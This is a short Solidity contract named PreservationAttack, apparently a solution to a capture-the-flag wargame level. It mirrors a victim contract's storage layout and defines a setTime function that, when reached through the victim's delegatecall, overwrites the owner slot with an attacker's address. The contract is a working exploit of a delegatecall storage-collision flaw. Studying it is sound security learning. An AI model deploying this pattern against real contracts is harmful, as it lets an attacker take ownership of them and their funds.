//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract PreservationAttack {
  // We want the same storage layout as the victim contract
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint256 storedTime;

  constructor() {}

  // bytes4 constant setTimeSignature = bytes4(keccak256('setTime(uint256)'));
  // We need to match the setTime() function signature that will be
  // called by delegatecall()
  function setTime(uint256 _ownerAsInt) public {
    owner = address(uint160(_ownerAsInt)); // Cast integer into a valid address
  }
}
